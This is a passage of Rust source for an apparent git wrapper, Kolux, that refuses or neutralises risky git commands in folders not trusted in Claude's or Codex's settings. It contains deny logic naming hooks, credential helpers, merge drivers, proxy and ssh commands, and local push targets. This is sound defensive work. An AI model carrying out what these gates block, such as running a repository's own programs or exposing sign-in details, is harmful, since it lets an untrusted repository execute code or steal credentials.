    if let Some((_, common)) = repo_dirs(dir) {
        // A linked worktree names its shared folder as "<git dir>/../..": resolve it to see the .git it is.
        let common = common.canonicalize().unwrap_or(common);
        if let Some(main) = common.parent().filter(|_| common.file_name().is_some_and(|n| n == ".git")) {
            folders.push(main.to_path_buf());
        }
    }
    let (claude, codex) = trust_files();
    let claude_doc = std::fs::read_to_string(claude).ok().and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok());
    let codex_doc = std::fs::read_to_string(codex).ok().and_then(|t| t.parse::<toml_edit::DocumentMut>().ok());
    folders.iter().any(|folder| {
        let by_claude = claude_doc.as_ref().zip(crate::trust::claude_key(folder).ok()).is_some_and(|(doc, key)| doc["projects"][key]["hasTrustDialogAccepted"] == serde_json::json!(true));
        let by_codex = codex_doc.as_ref().zip(crate::trust::codex_key(folder).ok()).is_some_and(|(doc, key)| doc.get("projects").and_then(|p| p.get(&key)).and_then(|p| p.get("trust_level")).and_then(|l| l.as_str()) == Some("trusted"));
        by_claude || by_codex
    })
}

#[cfg(test)]
thread_local! {
    /// Tests only: the agent config files `folder_trusted` reads (Claude's, Codex's) instead of the user's own.
    pub(crate) static TRUST_FILES: std::cell::RefCell<Option<(PathBuf, PathBuf)>> = const { std::cell::RefCell::new(None) };
}

#[cfg(not(test))]
fn trust_files() -> (PathBuf, PathBuf) {
    (crate::trust::claude_config_file(), crate::trust::codex_config_file())
}

/// Tests never read the developer's own agent files: no trust unless a test grants it.
#[cfg(test)]
fn trust_files() -> (PathBuf, PathBuf) {
    TRUST_FILES.with(|f| f.borrow().clone()).unwrap_or_else(|| (std::env::temp_dir().join("kolux-rs-test-no-claude.json"), std::env::temp_dir().join("kolux-rs-test-no-codex.toml")))
}

/// Tests only: no folder is trusted on this test's thread again (after `trust_for_test`).
#[cfg(test)]
pub(crate) fn untrust_for_test() {
    TRUST_FILES.with(|f| *f.borrow_mut() = None);
}

/// Tests only: the user trusts `folder` (as well as any folder trusted before) in Claude's file, for this test's thread.
#[cfg(test)]
pub(crate) fn trust_for_test(folder: &Path) {
    let key = crate::trust::claude_key(folder).unwrap();
    let mut project = serde_json::Map::new();
    project.insert("hasTrustDialogAccepted".into(), serde_json::Value::Bool(true));
    // Adds to what this thread already trusts (a test with two clones trusts both).
    let mut projects = TRUST_FILES
        .with(|f| f.borrow().clone())
        .and_then(|(file, _)| std::fs::read_to_string(file).ok())
        .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
        .and_then(|d| d["projects"].as_object().cloned())
        .unwrap_or_default();
    projects.insert(key, serde_json::Value::Object(project));
    let mut doc = serde_json::Map::new();
    doc.insert("projects".into(), serde_json::Value::Object(projects));
    let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(0);
    let file = std::env::temp_dir().join(format!("kolux-rs-test-trust-{}-{nanos}.json", std::process::id()));
    std::fs::write(&file, serde_json::Value::Object(doc).to_string()).unwrap();
    TRUST_FILES.with(|f| *f.borrow_mut() = Some((file, std::env::temp_dir().join("kolux-rs-test-no-codex.toml"))));
}

/// Whether `args` is a git command that talks to another repository (S4): fetch, pull, push, clone,
/// ls-remote, `remote update|show|prune|set-head`, and the submodule commands that fetch or clone.
fn network(args: &[&str]) -> bool {
    let rest = after_options(args);
    let second = rest.get(1).copied();
    match rest.first().copied() {
        Some("fetch" | "pull" | "push" | "clone" | "ls-remote" | "fetch-pack" | "send-pack" | "maintenance") => true,
        Some("remote") => matches!(second, Some("update" | "show" | "prune" | "set-head")),
        Some("submodule") => matches!(second, Some("update" | "add")),
        _ => false,
    }
}

/// Whether `args` is a git command that may merge content, and so run a merge driver (S4).
fn merges(args: &[&str]) -> bool {
    let rest = after_options(args);
    match rest.first().copied() {
        Some("merge" | "pull" | "rebase" | "cherry-pick" | "revert" | "am") => true,
        Some("stash") => matches!(rest.get(1).copied(), Some("pop" | "apply" | "branch")),
        _ => false,
    }
}

/// Whether `args` changes refs without writing content (`branch` and `tag` in their creating,
/// deleting and renaming forms, `update-ref`, `notes`): the `reference-transaction` hook runs on it.
fn ref_write(args: &[&str]) -> bool {
    let rest = after_options(args);
    match rest.first().copied() {
        Some("update-ref" | "notes") => true,
        Some("branch" | "tag") => {
            let flags = &rest[1..];
            let mutating = flags.iter().any(|a| matches!(*a, "-d" | "-D" | "-m" | "-M" | "-c" | "-C" | "-f" | "-u" | "--delete" | "--move" | "--copy" | "--force" | "--unset-upstream" | "--edit-description") || a.starts_with("--set-upstream-to"));
            let listing = flags.iter().any(|a| matches!(*a, "-l" | "--list" | "--show-current" | "-a" | "-r" | "--all" | "--remotes" | "-v" | "-vv" | "--verbose") || a.starts_with("--contains") || a.starts_with("--merged") || a.starts_with("--no-merged") || a.starts_with("--points-at") || a.starts_with("--format"));
            mutating || (!listing && flags.iter().any(|a| !a.starts_with('-')))
        }
        _ => false,
    }
}

/// Review fix 4 (B1 and the index should-fix): commands that change nothing a write gate looks at but can
/// still start a hook (`gc --auto` and maintenance: pre-auto-gc; rm, mv, update-index: post-index-change).
fn runs_hooks(args: &[&str]) -> bool {
    matches!(after_options(args).first().copied(), Some("gc" | "maintenance" | "rm" | "mv" | "update-index"))
}

const COMMIT_HOOKS: [&str; 5] = ["pre-commit", "prepare-commit-msg", "commit-msg", "post-commit", "post-rewrite"];
const EVERY_RUN_HOOKS: [&str; 3] = ["reference-transaction", "post-index-change", "pre-auto-gc"];

/// The hooks a run of `args` can start (githooks(5)); a run is checked only against its own.
fn hooks_run_by(args: &[&str]) -> Vec<&'static str> {
    let mut hooks: Vec<&'static str> = Vec::new();
    match after_options(args).first().copied() {
        Some("add") => hooks.push("post-index-change"),
        Some("commit") => {
            hooks.extend(COMMIT_HOOKS);
            hooks.extend(EVERY_RUN_HOOKS);
        }
        Some("push") => hooks.extend(["pre-push", "reference-transaction"]),
        Some("gc" | "maintenance") => hooks.extend(["pre-auto-gc", "reference-transaction", "post-index-change"]),
        Some("rm" | "mv" | "update-index") => hooks.extend(EVERY_RUN_HOOKS),
        Some("fetch" | "ls-remote" | "remote" | "clone" | "fetch-pack" | "send-pack" | "update-ref" | "branch" | "tag" | "notes") => hooks.extend(["reference-transaction", "pre-auto-gc"]),
        Some("merge" | "pull" | "rebase" | "cherry-pick" | "revert" | "am" | "stash" | "submodule") => {
            hooks.extend(COMMIT_HOOKS);
            hooks.extend(EVERY_RUN_HOOKS);
            hooks.extend(["pre-merge-commit", "post-merge", "post-checkout", "pre-rebase", "applypatch-msg", "pre-applypatch", "post-applypatch"]);
        }
        // checkout, switch, restore, reset, read-tree, checkout-index, sparse-checkout, worktree add, apply
        _ => {
            hooks.push("post-checkout");
            hooks.extend(EVERY_RUN_HOOKS);
        }
    }
    hooks
}

/// Whether git would run hook `name` from `dir`: the file (or, on Windows, `name.exe`) exists and, on Unix,
/// is executable. A `.sample` is never one of these names.
fn hook_file(dir: &Path, name: &str) -> bool {
    let mut candidates = vec![dir.join(name)];
    if cfg!(windows) {
        candidates.push(dir.join(format!("{name}.exe")));
    }
    candidates.iter().any(|p| {
        let Ok(meta) = std::fs::metadata(p) else { return false };
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            if meta.permissions().mode() & 0o111 == 0 {
                return false;
            }
        }
        meta.is_file()
    })
}

/// The first hook a run of `args` would start from any hooks folder the listing found: (hook, folder).
fn hook_in_the_way(args: &[&str], found: &[(String, String)]) -> Option<(String, String)> {
    let wanted = hooks_run_by(args);
    // Review fix 4 (B6): each hook git would look for is checked by its own path, not by listing the folder:
    // Git for Windows also runs `<hook>.exe`, and NTFS matches names whatever their case, which `is_file`
    // follows; a folder of decoys cannot push the real hook past a listing cap.
    found.iter().filter(|(k, _)| k == HOOKS_KEY).find_map(|(_, dir)| wanted.iter().find(|h| hook_file(Path::new(dir), h)).map(|h| (h.to_string(), dir.clone())))
}

/// Review fix 5/6 (B2): a push from an untrusted folder that could land in a repository on this computer.
/// The receiving repository runs its own hooks, filters and gc under its own config, so instead of judging
/// the target, the push is refused when any address it could use is local. git resolves the addresses:
/// the repository argument (or, for a bare `push`, every remote git could pick: the branch's pushRemote,
/// remote.pushDefault, the branch's remote, origin) through `git ls-remote --get-url`, which applies insteadOf
/// and reads legacy remote files and contacts nothing; and every push URL (`--all`) of every listed remote.
/// A name nothing resolves comes back as itself and counts as a path. A listing that fails refuses.
///
/// Review fix 8: a `url.<base>.pushInsteadOf` (or `insteadOf`) rule whose base is local refuses outright, since
/// `ls-remote --get-url` applies only `insteadOf` (P1-1); a candidate that starts with `-` refuses and every
/// candidate goes after `--` (P1-2); config values keep their spaces, as git does (`"origin "` is a remote of
/// its own, P1-3); and a listing git ends with anything but "unset" (exit 1), or that does not finish, refuses
/// instead of counting as unset (P2-2).
fn local_push_target(args: &[&str], dir: &Path) -> Option<String> {
    let rest = after_options(args);
    if rest.first() != Some(&"push") {
        return None;
    }
    push_gate(rest, dir).err()
}

/// One listing git of the push gate: Ok(Some(stdout)) when it succeeded, Ok(None) when it ended with
/// `absent` (what the command means by "nothing there"), Err(what) for any other exit or a timeout.
fn push_listing(args: &[&str], dir: &Path, absent: Option<i32>) -> Result<Option<String>, String> {
    let line = || format!("git {}", args.join(" "));
    let Some(out) = output_within(base_command(args, Some(dir), &[], &[]), LISTING_LIMIT) else { return Err(format!("`{}` did not finish", line())) };
    match out.status.code() {
        Some(0) => Ok(Some(String::from_utf8_lossy(&out.stdout).into_owned())),
        code if code.is_some() && code == absent => Ok(None),
        Some(code) => Err(format!("`{}` failed (exit {code})", line())),
        None => Err(format!("`{}` was stopped", line())),
    }
}

/// `out` without the one newline git ends a value with; nothing else is stripped (P1-3).
fn one_line(out: &str) -> String {
    out.strip_suffix('\n').unwrap_or(out).to_string()
}

/// See `local_push_target`: Err is the refusal's detail.
fn push_gate(rest: &[&str], dir: &Path) -> Result<(), String> {
    let value = |args: &[&str]| -> Result<Option<String>, String> { push_listing(args, dir, Some(1)).map(|v| v.map(|s| one_line(&s))) };
    // The repository argument: `--repo=<r>`, else the first word after the options (after `--` too).
    let mut repo = rest[1..].iter().find_map(|a| a.strip_prefix("--repo=")).map(str::to_string);
    if repo.is_none() {
        let mut words = rest[1..].iter().skip_while(|a| a.starts_with('-') && **a != "--");
        repo = words.find(|a| **a != "--").map(|a| a.to_string());
    }
    let mut candidates: Vec<String> = Vec::new();
    match repo {
        Some(r) => candidates.push(r),
        None => {
            // The full ref, stripped: `--short` prints `heads/main` when a tag is also called `main` (review fix 7).
            // A detached HEAD is "unset" (exit 1); a HEAD git cannot read is not, and refuses (P2-2).
            let branch = value(&["symbolic-ref", "-q", "HEAD"])?.and_then(|r| r.strip_prefix("refs/heads/").map(str::to_string)).unwrap_or_default();
            for key in [format!("branch.{branch}.pushRemote"), "remote.pushDefault".to_string(), format!("branch.{branch}.remote")] {
                if let Some(v) = value(&["config", "--get", &key])? {
                    candidates.push(v);
                }
            }
            candidates.push("origin".to_string());
        }
    }
    // P1-1: a rewrite rule to a local base, which git applies to the push address after the gate's own lookups.
    // Records: `<scope>\0<key>\n<value>\0`. A rule from the user's own settings (global, system, or their shell)
    // refuses too (fail-safe: it still lands on this computer), but the message says whose rule it is (P3).
    let rules = push_listing(&["config", "-z", "--show-scope", "--get-regexp", r"^url\..*\.(push)?insteadof$"], dir, Some(1))?.unwrap_or_default();
    let mut records = rules.split('\0');
    while let (Some(scope), Some(entry)) = (records.next(), records.next()) {
        let key = entry.split('\n').next().unwrap_or("");
        let base = key.strip_prefix("url.").and_then(|k| k.strip_suffix(".pushinsteadof").or_else(|| k.strip_suffix(".insteadof"))).unwrap_or(key);
        if is_local_url(base) {
            let whose = if matches!(scope, "local" | "worktree") { "the folder rewrites".to_string() } else { format!("your own git settings ({scope} config) rewrite") };
            return Err(format!("{whose} push addresses to {base} ({key})"));
        }
    }
    let mut urls: Vec<String> = Vec::new();
    // Review fix 7: every push URL of a candidate (`get-url --push --all` also reads every URL line of a legacy
    // remote file and applies pushInsteadOf); a candidate that is no remote at all (exit 2) goes through ls-remote.
    for c in candidates.iter().filter(|c| !c.is_empty()) {
        if c.starts_with('-') {
            return Err(format!("the push target {c} would be taken as an option"));
        }
        if let Some(all) = push_listing(&["remote", "get-url", "--push", "--all", "--", c], dir, Some(2))? {
            urls.extend(all.lines().map(|l| l.trim().to_string()));
            continue;
        }
        let url = one_line(&push_listing(&["ls-remote", "--get-url", "--", c], dir, None)?.unwrap_or_default());
        if url == *c && !c.contains(['/', '\\', ':']) && c != "." && c != ".." {
            return Err(format!("there is no remote called {c}, so git would take it as a folder on this computer"));
        }
        urls.push(url);
    }
    let remotes = push_listing(&["remote"], dir, None)?.unwrap_or_default();
    for remote in remotes.lines().filter(|r| !r.is_empty()) {
        let push = push_listing(&["remote", "get-url", "--push", "--all", "--", remote], dir, None)?.unwrap_or_default();
        urls.extend(push.lines().map(|l| l.trim().to_string()));
    }
    match urls.into_iter().filter(|u| !u.is_empty()).find(|u| is_local_url(u)) {
        Some(url) => Err(url),
        None => Ok(()),
    }
}

/// Where git resolves a relative `core.hooksPath`: the worktree's top level, or the git dir of a bare
/// repository (review fix 6; `rev-parse` runs no program). `dir` itself when neither can be read.
fn hooks_path_base(dir: &Path) -> PathBuf {
    for args in [&["rev-parse", "--show-toplevel"][..], &["rev-parse", "--absolute-git-dir"]] {
        if let Some(out) = output_within(base_command(args, Some(dir), &[], &[]), LISTING_LIMIT).filter(|o| o.status.success()) {
            let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if !p.is_empty() {
                return PathBuf::from(p);
            }
        }
    }
    dir.to_path_buf()
}

/// A git URL that names a repository on this computer: `file://`, or a path (git's rule: no `scheme://`
/// and no `host:path` scp form; a single letter before the colon is a Windows drive, any letter: git takes
/// `ä:/x` as a path too, review fix 8 follow-up P3).
fn is_local_url(url: &str) -> bool {
    let lower = url.to_ascii_lowercase();
    if lower.starts_with("file:") {
        return true;
    }
    if let Some(i) = url.find("://") {
        return !url[..i].chars().all(|c| c.is_ascii_alphanumeric() || "+.-".contains(c)) || i == 0;
    }
    match (url.find(':'), url.find(['/', '\\'])) {
        (Some(c), slash) if slash.is_none_or(|s| c < s) => {
            let mut before = url[..c].chars();
            matches!((before.next(), before.next()), (Some(drive), None) if drive.is_alphabetic())
        }
        _ => true,
    }
}

/// The plain refusal (DT-C229): what Kolux did not run, why, and what to do about it.
fn refusal(args: &[&str], dir: &Path, what: &str) -> String {
    let rest = after_options(args);
    let verb = rest.iter().take(if rest.first() == Some(&"worktree") { 2 } else { 1 }).copied().collect::<Vec<_>>().join(" ");
    format!("Kolux did not run `git {verb}` in {}: {what}, and the folder is not trusted. Trust the folder (open an agent in it and accept its trust prompt), then try again.", dir.display())
}

/// What a run of `args` in `dir` may do with the repository's own program keys, decided from the
/// keys already listed (DT-C229). A read has them blanked. A write that runs clean or smudge
/// filters (`writes_content`) keeps them in a trusted folder (the folder's own signing program too,
/// so a trusted commit still signs); in an untrusted folder that names a filter of its own it is
/// REFUSED instead of run with the filter skipped, because a skipped clean or smudge filter stores
/// plaintext where the repository expects ciphertext (git-crypt, transcrypt) or checks ciphertext out.
///
/// S4 (Txais 2026-11-08): in an untrusted folder a write, a ref change or a transfer (`network`) is
/// refused too, with the same plain message, when the folder sets a credential helper (transfers), a
/// hooks folder, an executable hook the command would start, or (merging commands) a merge driver.
/// None of these can be blanked without changing what the command does, so it is not run at all. A
/// trusted folder runs normally, keeping its own keys.
fn write_access(args: &[&str], dir: &Path, found: &[(String, String)]) -> Result<Access, String> {
    let writes = writes_content(args);
    let transfer = network(args);
    if !writes && !transfer && !ref_write(args) && !runs_hooks(args) {
        return Ok(Access::Reads);
    }
    if folder_trusted(dir) {
        return Ok(if writes || transfer { Access::TrustedWrite } else { Access::Reads });
    }
    let filters = if writes { program_filters(found) } else { Vec::new() };
    if !filters.is_empty() {
        let names = filters.iter().map(|(d, k)| format!("\"{d}\" ({k})")).collect::<Vec<_>>().join(", ");
        return Err(refusal(args, dir, &format!("the folder has its own git filter {names}, which runs a program every time files are staged or checked out")));
    }
    if incomplete(found) && (writes || transfer) {
        return Err(refusal(args, dir, "the folder has more submodules than Kolux can check for programs of their own"));
    }
    if transfer {
        if let Some((key, _)) = found.iter().find(|(k, _)| is_credential_key(k)) {
            return Err(refusal(args, dir, &format!("the folder sets its own credential helper ({key}), a program that is handed your sign-in details on every transfer")));
        }
        if let Some((key, _)) = found.iter().find(|(k, _)| is_pack_key(k)) {
            return Err(refusal(args, dir, &format!("the folder names its own program for the other end of a transfer ({key}), which git would run in place of its own")));
        }
    }
    // Review fix 5: a command whose only risk is a hook (gc, the index commands) is checked against the hooks
    // really in the folder's own hooks folder (husky and the like set one); anything else is refused outright.
    let hook_only = !writes && !transfer && !ref_write(args);
    if let Some((key, _)) = found.iter().find(|(k, _)| k == "core.hookspath").filter(|_| !hook_only) {
        return Err(refusal(args, dir, &format!("the folder points git at a hooks folder of its own ({key}), whose programs run around git commands")));
    }
    if let Some((key, _)) = found.iter().find(|(k, _)| k.starts_with("hook.") && k.ends_with(".command")) {
        return Err(refusal(args, dir, &format!("the folder names a hook program in its git config ({key}), which runs around git commands")));
    }
    let with_hooks_path: Vec<(String, String)> = found
        .iter()
        .filter(|(k, _)| k == "core.hookspath")
        .map(|(_, v)| (HOOKS_KEY.to_string(), if Path::new(v).is_absolute() { v.clone() } else { hooks_path_base(dir).join(v).to_string_lossy().into_owned() }))
        .chain(found.iter().cloned())
        .collect();
    if let Some((hook, folder)) = hook_in_the_way(args, &with_hooks_path) {
        return Err(refusal(args, dir, &format!("the folder has its own git hook \"{hook}\" (in {folder}), a program that runs around this command")));
    }
    if merges(args) {
        if let Some((key, _)) = found.iter().find(|(k, _)| is_merge_driver_key(k)) {
            return Err(refusal(args, dir, &format!("the folder has its own merge driver ({key}), a program that runs when changes are merged")));
        }
    }
    if let Some(url) = local_push_target(args, dir) {
        return Err(refusal(args, dir, &format!("the push could go to a repository on this computer ({url}), which runs programs of its own as it receives")));
    }
    Ok(Access::Reads)
}

/// Why `args` must not run in `cwd` (see `write_access`): None when the run may go ahead.
pub(crate) fn write_refusal(args: &[&str], cwd: Option<&Path>) -> Option<String> {
    let dir = cwd?;
    write_access(args, dir, &repo_programs(leading_options(args), dir)).err()
}

/// What replaces a folder's own transfer programs on a run (S4): environment variables for the ssh
/// and proxy commands (the environment outranks every config file, a folder's and a user's alike) and
/// config pairs for the per-remote programs.
#[derive(Default)]
struct Net {
    env: Vec<(&'static str, String)>,
}

/// The environment variable `name` as the parent process has it (tests: none, see `ISOLATED`).
fn parent_env(name: &str) -> Option<std::ffi::OsString> {
    #[cfg(test)]
    if ISOLATED.with(|i| i.get()) {
        return PARENT_ENV_FOR_TEST.with(|p| p.borrow().iter().find(|(k, _)| k == name).map(|(_, v)| std::ffi::OsString::from(v)));
    }
    std::env::var_os(name)
}

/// `value` as one word for a shell line (GIT_SSH_COMMAND is run through `sh`).
fn sh_quote(value: &str) -> String {
    let value = if cfg!(windows) { value.replace('\\', "/") } else { value.to_string() };
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// The values the USER's own config (system, global, and what their shell injects) gives the keys of
/// `USER_NET_KEYS`, in config order (a later one wins). A plain `git config` read: it runs no program.
fn user_net_values(cwd: &Path) -> Vec<(String, String)> {
    let args = ["config", "-z", "--show-scope", "--get-regexp", USER_NET_KEYS];
    let Some(out) = output_within(base_command(&args, Some(cwd), &[], &[]), LISTING_LIMIT).filter(|o| o.status.success()) else { return Vec::new() };
    let mut records = out.stdout.split(|b| *b == 0);
    let mut values = Vec::new();
    while let (Some(scope), Some(entry)) = (records.next(), records.next()) {
        if matches!(scope, b"local" | b"worktree") || entry.is_empty() {
            continue;
        }
        let entry = String::from_utf8_lossy(entry);
        let (key, value) = entry.split_once('\n').unwrap_or((&entry, ""));
        values.push((key.to_string(), value.trim_end_matches('\r').to_string()));
    }
    values
}

/// S4 (DT-C229): the ssh and proxy commands a folder's own config names (`core.sshCommand`,
/// `core.gitProxy`) never run. (A folder's own `remote.<name>.uploadpack` or `receivepack` cannot be
/// replaced, so a transfer in an untrusted folder that sets one is refused: see `is_pack_key`.) Each is REPLACED by what
/// the user's own config says for it, or git's own default when it says nothing, never just blanked
/// (a blank would also override the user's global value, and an empty ssh command runs nothing at
/// all). The ssh and proxy commands go through the environment, which outranks every config file,
/// unless the parent process set the variable itself (it already wins). `strict` (a transfer): a user
/// proxy rule that is limited to some domains cannot be handed over through the environment, so the
/// run is refused with `Err` instead of losing it silently; otherwise that case runs with no proxy.
fn net_overrides(found: &[(String, String)], cwd: &Path, strict: bool) -> Result<Net, String> {
    let mut keys: Vec<&str> = Vec::new();
    for (key, _) in found {
        if is_net_key(key) && !keys.contains(&key.as_str()) {
            keys.push(key);
        }
    }
    let mut net = Net::default();
    if keys.is_empty() {
        return Ok(net);
    }
    let user = user_net_values(cwd);
    let mine = |key: &str| user.iter().rev().find(|(k, _)| k == key).map(|(_, v)| v.clone());
    for key in keys {
        match key {
            // The parent process's own variable already wins over every config file: nothing to replace then.
            "core.sshcommand" if parent_env("GIT_SSH_COMMAND").is_none() => {
                let value = mine(key).or_else(|| parent_env("GIT_SSH").map(|p| sh_quote(&p.to_string_lossy()))).unwrap_or_else(|| "ssh".to_string());
                net.env.push(("GIT_SSH_COMMAND", value));
            }
            "core.gitproxy" if parent_env("GIT_PROXY_COMMAND").is_none() => {
                let value = match mine(key) {
                    None => String::new(),
                    Some(v) if !v.contains(" for ") => v,
                    Some(_) if strict => return Err("the folder sets its own core.gitProxy, and your own git settings have a proxy rule for particular domains that Kolux could not keep while ignoring the folder's".to_string()),
                    Some(_) => String::new(),
                };
                net.env.push(("GIT_PROXY_COMMAND", value));
            }
            _ => {}
        }
    }
    Ok(net)
}

/// Review fix 4/5 (B3, B4): in an untrusted partial clone a read never fetches on its own (git 2.45+), no
/// credential helper runs if one does (an empty value empties git's list), and, since git before 2.45
/// ignores GIT_NO_LAZY_FETCH, every transport is switched off (each by name: a folder's own
/// protocol.<name>.allow outranks protocol.allow).
fn no_lazy_fetch(found: &[(String, String)], dir: &Path, pairs: &mut Vec<(String, String)>, env: &mut Vec<(&'static str, String)>) {
    if !partial_clone(found) || folder_trusted(dir) {
        return;
    }
    env.push(("GIT_NO_LAZY_FETCH", "1".to_string()));
    pairs.push(("credential.helper".to_string(), String::new()));
    for proto in ["protocol.allow", "protocol.file.allow", "protocol.git.allow", "protocol.ssh.allow", "protocol.http.allow", "protocol.https.allow"] {
        pairs.push((proto.to_string(), "never".to_string()));
    }
}

/// A git process with Kolux's environment (see `base_command`) for ANY run, the one a caller that
/// may write or transfer must use: the listing, the refusal and the blanking come from one decision,
/// so nothing can change between the check and the run. Err is the refusal's plain message.
pub(crate) fn command_checked(args: &[&str], cwd: Option<&Path>) -> Result<Command, String> {
    let Some(dir) = cwd else { return Ok(base_command(args, None, &[], &[])) };
    let found = repo_programs(leading_options(args), dir);
    let access = write_access(args, dir, &found)?;
    let args = guarded(args, &found, access);
    let mut pairs = overrides_for(&found, access);
    let mut env = Vec::new();
    // A trusted folder's own transfer programs are the user's to run; everywhere else they are replaced.
    if access == Access::Reads {
        env = net_overrides(&found, dir, network(&args)).map_err(|what| refusal(&args, dir, &what))?.env;
        // Review fix 6: an untrusted push never pushes submodules (their remotes are not checked).
        // Review fix 7: and git itself refuses a local path or file:// for it, however the address was chosen.
        if after_options(&args).first() == Some(&"push") {
            pairs.push(("push.recurseSubmodules".to_string(), "no".to_string()));
            pairs.push(("protocol.file.allow".to_string(), "never".to_string()));
        }
        if !network(&args) {
            no_lazy_fetch(&found, dir, &mut pairs, &mut env);
        }
    }
    Ok(base_command(&args, cwd, &pairs, &env))
}

/// A git process with Kolux's environment (see `base_command`) for a READ, its repository's own
/// program keys blanked (T-779, review finding 1) and its transfer programs replaced (S4). A run
/// that writes content or transfers must go through `command_checked`; here it is a bug, and a
/// debug build stops on it.
pub(crate) fn command(args: &[&str], cwd: Option<&Path>) -> Command {
    debug_assert!(cwd.is_none() || !(writes_content(args) || network(args) || ref_write(args) || runs_hooks(args)), "git {args:?} writes, transfers or runs hooks: use git::command_checked");
    let found = cwd.map(|dir| repo_programs(leading_options(args), dir)).unwrap_or_default();
    let args = guarded(args, &found, Access::Reads);
    let mut pairs = overrides_for(&found, Access::Reads);
    let mut env = cwd.and_then(|dir| net_overrides(&found, dir, false).ok()).map(|net| net.env).unwrap_or_default();
    if let Some(dir) = cwd {
        no_lazy_fetch(&found, dir, &mut pairs, &mut env);
    }
    base_command(&args, cwd, &pairs, &env)
}

/// `args`, with submodules left out of a status or diff when the listing of the repository's
/// programs is incomplete (see `INCOMPLETE_KEY`): git then starts no child git for a submodule whose
/// own config Kolux could not read. An explicit `--ignore-submodules` of the caller's stays.
fn guarded<'a>(args: &[&'a str], found: &[(String, String)], access: Access) -> Vec<&'a str> {
    let mut out = args.to_vec();
    if access == Access::Reads && incomplete(found) && !args.iter().any(|a| a.starts_with("--ignore-submodules")) {
        let at = args.len() - after_options(args).len();
        if matches!(args.get(at).copied(), Some("status" | "diff" | "diff-files" | "diff-index")) {
            out.insert(at + 1, "--ignore-submodules=all");
        }
    }
    out
}

fn base_command(args: &[&str], cwd: Option<&Path>, repo_programs: &[(String, String)], net_env: &[(&'static str, String)]) -> Command {
    let mut cmd = Command::new("git");
    cmd.args(args);
    #[cfg(test)]
    TRACE2.with(|t| {
        if let Some(path) = &*t.borrow() {
            cmd.env("GIT_TRACE2_EVENT", path);
        }
    });
    #[cfg(test)]
    if ISOLATED.with(|i| i.get()) {
        cmd.env("GIT_CONFIG_GLOBAL", GLOBAL_FOR_TEST.with(|g| g.borrow().clone()).unwrap_or_else(empty_global_config)).env("GIT_CONFIG_NOSYSTEM", "1");
        for v in ["GIT_CONFIG_COUNT", "GIT_CONFIG_PARAMETERS", "GIT_ASKPASS", "SSH_ASKPASS", "GIT_SSH_COMMAND", "GIT_SSH", "GIT_PROXY_COMMAND"] {
            cmd.env_remove(v);
        }
    }
    // GIT-001 (T-033-b): a status read never rewrites the index on its own (git's optional lock),
    // so the Source Control watcher is not woken by its own reads. Required locks are unaffected.
    cmd.env("GIT_OPTIONAL_LOCKS", "0");
    if let Some(dir) = cwd {
        cmd.current_dir(dir);
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000; // no console flashes up behind the app
        cmd.creation_flags(CREATE_NO_WINDOW);
    }
    // GIT-070: on macOS and Linux git leads its own process group, so stopping a stalled read
    // (procs::kill_tree's group signal) also ends the hooks, diff tools and pagers it started.
    // Outside the terminal's foreground group a prompt would stop git (SIGTTIN): it fails at once.
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0).env("GIT_TERMINAL_PROMPT", "0");
    }
    // T-779 (P2A-01) and GIT-070: the config Kolux forces (`injected_config`), in slots after any pairs the
    // user's own shell injects the same way; a git older than 2.31 ignores all of it. Review fix 8 (P2-1): the
    // slots alone are not enough. A parent's GIT_CONFIG_PARAMETERS is read after them, so Kolux's pairs are
    // appended to it as well, and a parent's GIT_ALLOW_PROTOCOL makes git ignore every protocol.*.allow, so
    // the transports Kolux switches off are taken out of that list. Neither variable is set when the parent
    // set none. An isolated test sees none of the three (`parent_env`), so ours start at slot 0.
    let existing = parent_env("GIT_CONFIG_COUNT");
    for (name, value) in injected_config(existing.as_deref(), repo_programs) {
        cmd.env(name, value);
    }
    if let Some(parameters) = config_parameters(parent_env("GIT_CONFIG_PARAMETERS").as_deref(), repo_programs) {
        cmd.env("GIT_CONFIG_PARAMETERS", parameters);
    }
    if let Some(allowed) = allow_protocol(parent_env("GIT_ALLOW_PROTOCOL").as_deref(), repo_programs) {
        cmd.env("GIT_ALLOW_PROTOCOL", allowed);
    }
    // S4: the replacements for a folder's own ssh and proxy commands (see `net_overrides`).
    for (name, value) in net_env {
        cmd.env(name, value);
    }
    cmd
}

/// GIT-070: how many short git reads one worktree runs at once. There is no app-wide cap: sixteen
/// worktrees each get their own turns, and a slow repository never holds up another one.
const READS_PER_WORKTREE: usize = 4;
/// GIT-070: how long a short read may take before it and everything it started are stopped.
pub(crate) const SHORT_READ_LIMIT: std::time::Duration = std::time::Duration::from_secs(90);

/// GIT-070: the git commands that only read and finish quickly. Only these wait for a turn and get
/// `SHORT_READ_LIMIT`; everything else (worktree add, fetch, clone, push, pull, commit, merge...)
/// runs at once with no time limit added here, so a long checkout or transfer is never cut off.
const SHORT_READS: [&str; 18] = ["status", "diff", "log", "show", "rev-parse", "rev-list", "ls-files", "ls-tree", "for-each-ref", "cat-file", "cherry", "merge-base", "symbolic-ref", "describe", "check-ignore", "name-rev", "blame", "count-objects"];

/// GIT-070: whether `args` is a short read (see `SHORT_READS`); `worktree` counts only as
/// `worktree list`. Leading `-c key=value` / `-C dir` and other options are skipped.
pub(crate) fn short_read(args: &[&str]) -> bool {
    let rest = after_options(args);
    rest.first().is_some_and(|w| SHORT_READS.contains(w) || (*w == "worktree" && rest.get(1) == Some(&"list")))
}

/// `args` from the git command word on: leading `-c key=value` / `-C dir` and other options skipped.
fn after_options<'a, 'b>(args: &'a [&'b str]) -> &'a [&'b str] {
    let mut i = 0;
    while let Some(w) = args.get(i) {
        if *w == "-c" || *w == "-C" {
            i += 2;
        } else if w.starts_with('-') {
            i += 1;
        } else {
            return &args[i..];
        }
    }
    &[]
}

/// GIT-070: turns for short reads, counted per worktree. Foreground work (the panel on screen) that
/// is waiting goes before background work (badges, sweeps) waiting on the same worktree.
pub(crate) struct Limiter {
    at_once: usize,
    /// worktree -> (running, foreground callers waiting)
